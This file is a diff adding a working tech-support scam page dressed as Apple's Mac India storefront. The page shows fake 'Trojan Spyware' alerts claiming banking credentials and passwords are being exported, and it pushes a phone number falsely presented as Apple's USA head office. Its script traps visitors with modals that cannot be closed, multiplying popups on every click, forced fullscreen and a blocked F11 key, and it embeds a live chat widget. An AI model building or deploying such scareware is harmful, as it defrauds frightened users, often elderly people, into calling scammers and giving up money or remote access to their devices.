@@ -1,0 +1,950 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Mac - India</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap Icons -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
+
+    <link rel="stylesheet" href="./style.css">
+
+    <style>
+        .icon-row img {
+            width: 40%;
+        }
+
+        .icon-row {
+            display: flex;
+            justify-content: center;
+        }
+
+
+
+        .pageTitle-intro {
+            max-width: 50.25rem !important;
+        }
+
+        /* .modal-content {
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: none;
+            height: 200px;
+        } */
+
+        .modal-header {
+            color: #333;
+            padding: 20px;
+            align-items: baseline;
+
+        }
+
+        .modal-body {
+            padding: 15px;
+        }
+
+        .alert-text {
+            color: #333;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            text-align: start;
+            font-size: 14px;
+        }
+
+        .alert-text p {
+            margin-bottom: 15px;
+            font-size: 12px;
+            text-align: justify;
+        }
+
+        .highlight {
+            color: #e63946;
+            font-weight: 600;
+        }
+
+        .support-number {
+            font-size: 25px;
+            font-weight: 700;
+            color: #0071e3;
+            margin: 10px 0;
+            padding: 12px;
+        }
+
+        .counter {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .btn-primary {
+            background: #0071e3;
+            border: none;
+            padding: 10px 25px;
+            font-weight: 600;
+        }
+
+        .btn-primary:hover {
+            background: #0056b3;
+        }
+
+        .btn-outline-secondary {
+            padding: 10px 25px;
+            font-weight: 600;
+        }
+
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.05);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: rgba(0, 0, 0, 0.7);
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .blink {
+            animation: blink 0.5s linear 3;
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @media (min-width: 992px) {
+
+            .modal-lg,
+            .modal-xl {
+                --bs-modal-width: 600px !important;
+                --bs-modal-height: 400px !important;
+            }
+        }
+
+        /* Style for stacked modals */
+        .modal-backdrop {
+            opacity: 0.8;
+        }
+
+        .modal-stack {
+            position: fixed;
+            z-index: 1080;
+        }
+
+        .modal-stack.show .modal-dialog {
+            transform: scale(1);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Custom positioning */
+        .modal-dialog.positioned {
+            position: absolute;
+        }
+
+        .apple-logo {
+            font-size: 60px;
+            color: #333;
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        .callnowbtn {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+        }
+
+        .actionbtn {
+            position: absolute;
+            right: 0px;
+            bottom: 15px;
+        }
+
+        @media (max-width: 576px) {
+            .modal-dialog-centered {
+    display: flex;
+    align-items: center;
+    min-height: calc(100% - var(--bs-modal-margin) * 120)!important ;
+}
+            .card-body p {font-size: 13px;}
+            .bluebox .bluecontent p {font-size: 12px; text-align: justify;}
+            .bluebox {margin: 0px 20px;
+        width: 82%;
+        top: 42%;
+        left: 45%;
+        transform: translate(-50%, -50%);
+        height: 390px;
+        overflow: overlay;}
+            
+            .tooltip1 {width: auto; margin: 0px 20px;     right: 0px; bottom: 2px;}
+            .btn-outline-secondary {
+                padding: 10px 15px;
+                font-weight: 600;
+            }
+
+            /* .modal-content {
+                background: #333;
+                height: 270px;
+            } */
+
+            .positioned .modal-header {
+                color: #333;
+                padding: 0px;
+                border-bottom: none;
+                padding-right: 16px;
+                padding-top: 15px;
+            }
+
+            /* .modal-dialog.modal-lg.positioned .modal-content {
+                background: #333;
+                height: 270px !important;
+            } */
+
+            .alert-text {
+                color: #fff;
+            }
+
+            .modal.show .modal-dialog {
+                top: 10% !important;
+                max-width: 95% !important;
+                margin: auto;
+            }
+        }
+
+        /* ðŸ”´ CTA button look + bounce */
+        .callnowbtn .btn {
+            font-size: 14px;
+            border: none;
+            font-weight: 600;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background: linear-gradient(45deg, #ff3b3b, #c70000);
+            box-shadow: 0 10px 24px rgba(199, 0, 0, 0.35), 0 0 0 6px rgba(255, 59, 59, 0.12) inset;
+            animation: pulseBounce 1.8s ease-in-out infinite;
+            transition: transform .25s ease, box-shadow .25s ease, background .25s ease;
+        }
+
+        .callnowbtn .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 14px 28px rgba(199, 0, 0, 0.45), 0 0 0 8px rgba(255, 59, 59, 0.18) inset;
+        }
+
+        .call-icon {
+            display: inline-block;
+            line-height: 1;
+            font-size: 18px;
+            vertical-align: middle;
+            margin-right: 10px;
+            transform-origin: 50% 10%;
+            animation: ringShake 1s ease-in-out infinite;
+            -webkit-animation: ringShake 1s ease-in-out infinite;
+        }
+
+        /* Icon ring-shake keyframes */
+        @keyframes ringShake {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            10% {
+                transform: rotate(16deg);
+            }
+
+            20% {
+                transform: rotate(-16deg);
+            }
+
+            30% {
+                transform: rotate(12deg);
+            }
+
+            40% {
+                transform: rotate(-12deg);
+            }
+
+            50% {
+                transform: rotate(8deg);
+            }
+
+            60% {
+                transform: rotate(-8deg);
+            }
+
+            70% {
+                transform: rotate(4deg);
+            }
+
+            80% {
+                transform: rotate(-4deg);
+            }
+
+            100% {
+                transform: rotate(0deg);
+            }
+        }
+
+        /* Button bounce/pulse */
+        @keyframes pulseBounce {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+                box-shadow: 0 10px 24px rgba(199, 0, 0, .35), 0 0 0 6px rgba(255, 59, 59, .12) inset;
+            }
+
+            50% {
+                transform: translateY(-6px) scale(1.05);
+                box-shadow: 0 16px 32px rgba(199, 0, 0, .45), 0 0 0 8px rgba(255, 59, 59, .16) inset;
+            }
+        }
+
+        /* Click overlay - FIXED */
+        .click-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            cursor: pointer;
+            background: transparent;
+            display: none;
+            /* Hidden by default */
+        }
+
+        /* Show overlay only when needed */
+        .click-overlay.active {
+            display: block;
+        }
+
+        @media (max-width:400px) {
+
+            .btn-primary {
+                background: #0071e3;
+                border: none;
+                padding: 6px 16px;
+                font-weight: 600;
+                font-size: 15px;
+            }
+
+            .btn-outline-secondary {
+                padding: 6px 16px;
+                margin-right: 10px !important;
+                font-weight: 600;
+                font-size: 15px;
+            }
+
+            .callnowbtn {
+                position: absolute;
+                bottom: 9px;
+                left: 13px;
+            }
+
+            .callnowbtn .btn {
+                font-size: 14px;
+                border: none;
+                font-weight: 600;
+                padding: 7px 7px;
+            }
+
+            .actionbtn {
+                position: absolute;
+                right: 0px !important;
+                bottom: 15px;
+            }
+
+            #applealertmodeltwo .btn-primary {
+                margin-right: 0px !important;
+            }
+
+            #applealertmodeltwo .btn-outline-secondary {
+                margin-right: 5px !important;
+            }
+
+
+        }
+    </style>
+</head>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/65c263710ff6374032c9fec9/1iqto842a';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+<body>
+
+    <div id="clickOverlay" class="click-overlay"></div>
+
+    <!-- Top Navigation Bar -->
+    <nav class="navbar navbar-expand-lg apple-navbar py-1">
+        <div class="container">
+            <!-- Apple Logo -->
+            <a class="navbar-brand" href="#">
+                <i class="bi bi-apple"></i>
+            </a>
+
+            <!-- Desktop Navigation -->
+            <div class="d-none d-lg-flex ms-4 align-items-center gap-4">
+                <a class="nav-link" href="#">Store</a>
+                <a class="nav-link" href="#">Mac</a>
+                <a class="nav-link" href="#">iPad</a>
+                <a class="nav-link" href="#">iPhone</a>
+                <a class="nav-link" href="#">Watch</a>
+                <a class="nav-link" href="#">AirPods</a>
+                <a class="nav-link" href="#">TV & Home</a>
+                <a class="nav-link" href="#">Entertainment</a>
+                <a class="nav-link" href="#">Accessories</a>
+                <a class="nav-link" href="#">Support</a>
+                <a class="nav-link" href="#"><svg xmlns="http://www.w3.org/2000/svg" width="15px" height="44px"
+                        viewBox="0 0 15 44">
+                        <path
+                            d="M14.298,27.202l-3.87-3.87c0.701-0.929,1.122-2.081,1.122-3.332c0-3.06-2.489-5.55-5.55-5.55c-3.06,0-5.55,2.49-5.55,5.55 c0,3.061,2.49,5.55,5.55,5.55c1.251,0,2.403-0.421,3.332-1.122l3.87,3.87c0.151,0.151,0.35,0.228,0.548,0.228 s0.396-0.076,0.548-0.228C14.601,27.995,14.601,27.505,14.298,27.202z M1.55,20c0-2.454,1.997-4.45,4.45-4.45 c2.454,0,4.45,1.997,4.45,4.45S8.454,24.45,6,24.45C3.546,24.45,1.55,22.454,1.55,20z">
+                        </path>
+                    </svg></a>
+                <a class="nav-link" href="#"><svg height="44" viewBox="0 0 14 44" width="14"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="m11.3535 16.0283h-1.0205a3.4229 3.4229 0 0 0 -3.333-2.9648 3.4229 3.4229 0 0 0 -3.333 2.9648h-1.02a2.1184 2.1184 0 0 0 -2.117 2.1162v7.7155a2.1186 2.1186 0 0 0 2.1162 2.1167h8.707a2.1186 2.1186 0 0 0 2.1168-2.1167v-7.7155a2.1184 2.1184 0 0 0 -2.1165-2.1162zm-4.3535-1.8652a2.3169 2.3169 0 0 1 2.2222 1.8652h-4.4444a2.3169 2.3169 0 0 1 2.2222-1.8652zm5.37 11.6969a1.0182 1.0182 0 0 1 -1.0166 1.0171h-8.7069a1.0182 1.0182 0 0 1 -1.0165-1.0171v-7.7155a1.0178 1.0178 0 0 1 1.0166-1.0166h8.707a1.0178 1.0178 0 0 1 1.0164 1.0166z">
+                        </path>
+                    </svg></a>
+            </div>
+
+            <!-- Mobile Toggle and Search -->
+            <div class="ms-auto d-flex align-items-center">
+                <a href="#" class="nav-link d-lg-none"><i class="bi bi-search"></i></a>
+                <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse"
+                    data-bs-target="#mobileNav">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Mobile Navigation -->
+    <div class="collapse d-lg-none" id="mobileNav">
+        <div class="container py-3">
+            <div class="row">
+                <div class="col-6">
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">Store</a>
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">Mac</a>
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">iPad</a>
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">iPhone</a>
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">Watch</a>
+                </div>
+                <div class="col-6">
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">AirPods</a>
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">TV & Home</a>
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">Entertainment</a>
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">Accessories</a>
+                    <a class="d-block py-2 text-decoration-none text-dark" href="#">Support</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+
+    <div class="container-fluid prodnav">
+        <div class="container">
+
+            <div class="row">
+                <div class="col-md-12">
+                    <ul class="item-list">
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-1.svg" class="img-fluid" alt="apple">
+                                <span> MacBook Air</span>
+                                <small class="text-danger">New</small>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-2.svg" class="img-fluid" alt="apple">
+                                <span> MacBook Pro</span>
+                                <small class="text-danger">New</small>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-3.svg" class="img-fluid" alt="apple">
+                                <span> iMac</span>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-4.svg" class="img-fluid" alt="apple">
+                                <span> Mac mini</span>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-5.svg" class="img-fluid" alt="apple">
+                                <span> Mac studio</span>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-6.svg" class="img-fluid" alt="apple">
+                                <span> Mac Pro</span>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-7.svg" class="img-fluid" alt="apple">
+                                <span> Compare</span>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-8.svg" class="img-fluid" alt="apple">
+                                <span> Displays</span>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-9.svg" class="img-fluid" alt="apple">
+                                <span> Accessories</span>
+
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-10.svg" class="img-fluid" alt="apple">
+                                <span> Tahoe</span>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-img">
+                                <img src="./img/micon-11.svg" class="img-fluid" alt="apple">
+                                <span> Shop Mac</span>
+                            </div>
+                        </li>
+
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container-fluid ribbon bg-light py-2 ">
+        <div class="container">
+            <div class="row">
+                <p class="mb-0">Save ₹10000 or more with education pricing.* Plus get up to 12 months of No Cost EMI on
+                    selected Mac models for a limited time.**Shop Mac</p>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="container-fluid main-hero">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="title-heading">
+                        <h1>Mac</h1>
+                    </div>
+                </div>
+                <div class="col-md-12">
+                    <div class="prodbox">
+                        <img src="./img/macbook.png" class="img-fluid" alt="macbook">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="bluebox">
+
+        <div class="bluecontent tex-white">
+            <p class="fw-bold text-center">MacOS - Warning Alert System</p>
+            <h6 class="fw-bold text-center">** ACCESS HAS BEEN BLOCKED FOR SECURITY REASONS AND FOR YOUR SAFETY **</h6>
+            <hr>
+            <br>
+            <br>
+            <p>Alert ID: MAC-882-991X Threat Level: CRITICAL</p>
+
+            <p>Your System has alerted us that it has been infected with Trojan Spyware Issues. The following data is currently being exported to a remote server:</p>
+            
+            <ul>
+                <li>Email Passwords & Private Conversations</li>
+
+                <li>Banking Credentials & Credit Card Details</li>
+
+                <li>Social Media Logins (Facebook, Instagram)</li>
+
+                <li>Local Photos and Personal Documents</li>
+            </ul>
+
+            <p>System Status: Administrative Lockdown. Your browser has been frozen to prevent further data breach.</p>
+            
+        </div>
+
+
+
+        <div class="modal-footer-custom ">
+            <button class="btn-modal ">
+                Cancel
+            </button>
+            <button class="btn-modal ">
+                Ok
+            </button>
+        </div>
+
+    </div>
+
+
+    <div class="tooltip1">
+        <h5 class="mb-0 text-center fw-bold text-dark"><i class="bi bi-apple me-1"></i> Apple</h5>
+        <p>Contact Apple Support (USA Head Office) Number:</p>
+        
+        <a href="tel:+18303199673">+1-830-319-9673</a>
+    </div>
+    <!-- content end -->
+
+
+
+        
+
+    <div id="modalContainer"></div>
+
+    <!-- Main Modal -->
+    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel"
+        aria-hidden="true">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered modal-dialog-centered-sm">
+            <div class="modal-content">
+
+                <div class="modal-header pb-0 ">
+                    <div class="modal-head">
+                        <p> <i class="bi bi-apple"></i>
+
+                            </svg>
+                            <span>Apple System Security Center</span>
+                        </p>
+                    </div>
+
+                    <div>
+                        <button type="button" class="p-0 btn-close me-3 " id="closebtn"></button>
+                    </div>
+                </div>
+                <div class="modal-body text-center">
+                    <div class="card-body text-center  border-bottom mb-3 ">
+
+                        <p class="text-danger fw-bold mb-1">App: Ads.finactrack(2).dll</p>
+                        <p class="text-danger fw-bold mb-0">Threat Detected: Trojan Spyware</p>
+
+                        <div class="icon-row ">
+                           
+
+                            <img src="./img/popup_secure.png" class="img-fluid" alt="popup">
+                        </div>
+
+                        <p class="fw-semibold mb-0">
+                            Access to this Apple Device has been blocked for security reasons.
+                        </p>
+
+                        <p class="text-primary fw-bold ">
+                            Contact Apple (USA head office): <a href="tel:+18303199673">+1-830-319-9673</a>
+                        </p>
+
+                    </div>
+                    <div class="card-footer bg-white d-flex justify-content-between align-items-center">
+                        <div class="d-flex align-items-center gap-2">
+                            <i class="bi bi-apple"></i>
+                            <span>Apple</span>
+                        </div>
+
+                        <div class="d-flex gap-2">
+                            <button class="btn btn-outline-secondary px-4" id="okBtn">Deny</button>
+                            <button class="btn btn-primary px-4" id="cancelBtn">Allow</button>
+                        </div>
+                    </div>
+                    <!-- <div class="text-end gap-4 mt-4 actionbtn">
+
+                        <button type="button" class="btn btn-primary me-2" id="okBtn"> OK</button>
+
+                        <button type="button" class="btn btn-outline-secondary me-3" id="cancelBtn">Cancel</button>
+                    </div> -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+
+
+
+        let modalCount = 0;
+        const maxModals = Infinity;
+        let fullScreenTriggered = false;
+
+        // Function to trigger full screen
+        function triggerFullScreen() {
+            const elem = document.documentElement;
+            if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
+                if (elem.requestFullscreen) {
+                    elem.requestFullscreen().catch(err => {
+                        console.error('Fullscreen error:', err);
+                    });
+                } else if (elem.webkitRequestFullscreen) {
+                    elem.webkitRequestFullscreen();
+                } else if (elem.msRequestFullscreen) {
+                    elem.msRequestFullscreen();
+                }
+            }
+        }
+
+        // Function to exit fullscreen
+        function exitFullScreen() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            } else if (document.msExitFullscreen) {
+                document.msExitFullscreen();
+            }
+        }
+
+        // Function to generate random position within viewport
+        function getRandomPosition(modalWidth, modalHeight) {
+            const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+            const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+
+            if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
+                return {
+                    top: Math.max(0, (viewportHeight - modalHeight) / 2),
+                    left: Math.max(0, (viewportWidth - modalWidth) / 2)
+                };
+            }
+
+            const maxX = viewportWidth - modalWidth;
+            const maxY = viewportHeight - modalHeight;
+
+            const randomX = Math.floor(Math.random() * (maxX + 4));
+            const randomY = Math.floor(Math.random() * (maxY + 1));
+
+            return { top: randomY, left: randomX };
+        }
+
+        // Function to create a new modal with random position
+        function createNewModal() {
+            if (modalCount >= maxModals) return null;
+
+            modalCount++;
+
+            const newModal = document.createElement('div');
+            newModal.className = 'modal fade modal-stack';
+            newModal.id = `appleAlertModal-${modalCount}`;
+            newModal.tabIndex = -1;
+            newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
+            newModal.setAttribute('aria-hidden', 'true');
+
+            newModal.innerHTML = `
+                <div class="modal-dialog modal-lg positioned">
+                <div class="modal-content" id="applealertmodeltwo">
+                  
+
+                     <div class="modal-header pb-0 ">
+                    <div class="modal-head">
+                        <p> <i class="bi bi-apple"></i>
+
+                            </svg>
+                            <span>Apple System Security Center</span>
+                        </p>
+                    </div>
+
+                    <div>
+                        <button type="button" class="p-0 btn-close me-3 " id="closebtn"></button>
+                    </div>
+                </div>
+                    <div class="modal-body text-center">
+                            <div class="card-body text-center  border-bottom mb-3 ">
+
+                        <p class="text-danger fw-bold mb-1">App: Ads.finactrack(2).dll</p>
+                        <p class="text-danger fw-bold mb-0">Threat Detected: Trojan Spyware</p>
+
+                        <div class="icon-row ">
+                           
+
+                            <img src="./img/popup_secure.png" class="img-fluid" alt="popup">
+                        </div>
+
+                        <p class="fw-semibold mb-0">
+                            Access to this Apple Device has been blocked for security reasons.
+                        </p>
+
+                        <p class="text-primary fw-bold ">
+                            Contact Apple (USA head office): <a href="tel:+18303199673">+1-830-319-9673</a>
+                        </p>
+
+                    </div>
+
+                        <div class="card-footer bg-white d-flex justify-content-between align-items-center">
+                        <div class="d-flex align-items-center gap-2">
+                            <i class="bi bi-apple"></i>
+                            <span>Apple</span>
+                        </div>
+
+                        <div class="d-flex gap-2">
+                            <button class="btn btn-outline-secondary px-4 ok-btn" id="okBtn">Deny</button>
+                            <button class="btn btn-primary px-4 cancel-btn" id="cancelBtn">Allow</button>
+                        </div>
+                    </div>
+                      
+                    </div>
+                </div>
+            </div>
+        `;
+
+            document.getElementById('modalContainer').appendChild(newModal);
+
+            const modal = new bootstrap.Modal(newModal, {
+                backdrop: 'static',
+                keyboard: false
+            });
+
+            const modalDialog = newModal.querySelector('.modal-dialog');
+            let modalWidth, modalHeight;
+
+            modalWidth = Math.min(600, window.innerWidth * 0.9);
+            modalHeight = window.innerWidth <= 576 ? 250 : 400;
+
+            const { top, left } = getRandomPosition(modalWidth, modalHeight);
+            modalDialog.style.top = `${top}px`;
+            modalDialog.style.left = `${left}px`;
+
+            if (window.innerWidth <= 576) {
+                modalDialog.style.width = `${modalWidth}px`;
+                modalDialog.style.maxWidth = 'none';
+            }
+
+            newModal.style.zIndex = 1080 + modalCount;
+            modal.show();
+
+            // Ensure tel: link actually triggers phone call
+            newModal.querySelectorAll('.tel-link').forEach(link => {
+                link.addEventListener('click', (e) => {
+                    window.location.href = link.getAttribute('href');
+                });
+            });
+
+            // return modal;
+        }
+
+        // Initialize the first modal
+        const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
+            backdrop: 'static',
+            keyboard: false
+        });
+
+        document.addEventListener('DOMContentLoaded', function () {
+            appleAlertModal.show();
+        });
+
+        // Add event listener to body for fullscreen and modal creation
+        document.body.addEventListener('click', () => {
+            triggerFullScreen();
+            createNewModal();
+        });
+
+        // On ESC â†’ exit fullscreen
+        document.addEventListener("keydown", function (e) {
+            if (e.key === "Escape") {
+                exitFullScreen();
+            }
+            if (e.key === "F11" || e.keyCode === 122) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, true);
+
+        document.addEventListener("keyup", function (e) {
+            if (e.key === "F11" || e.keyCode === 122) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, true);
+
+        // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
+        document.addEventListener("fullscreenchange", () => {
+            if (!document.fullscreenElement) {
+                // User exited fullscreen
+                document.body.addEventListener("click", triggerFullScreen, { once: true });
+            }
+        });
+
+        window.addEventListener('resize', function () {
+            const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
+
+            modals.forEach(modal => {
+                const viewportHeight = window.innerHeight;
+                const modalHeight = modal.offsetHeight;
+                let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
+
+                if (top + modalHeight > viewportHeight) {
+                    top = Math.max(0, viewportHeight - modalHeight);
+                }
+
+                modal.style.top = `${top}px`;
+                modal.style.left = `0`;
+                modal.style.width = `100%`;
+                modal.style.maxHeight = `${viewportHeight}px`;
+                modal.style.overflow = `hidden`;
+            });
+        });
+    </script>
+
+
+
+    <!-- Main Content -->
+
+    <!-- Bootstrap JS -->
+
+</body>
+
+</html>
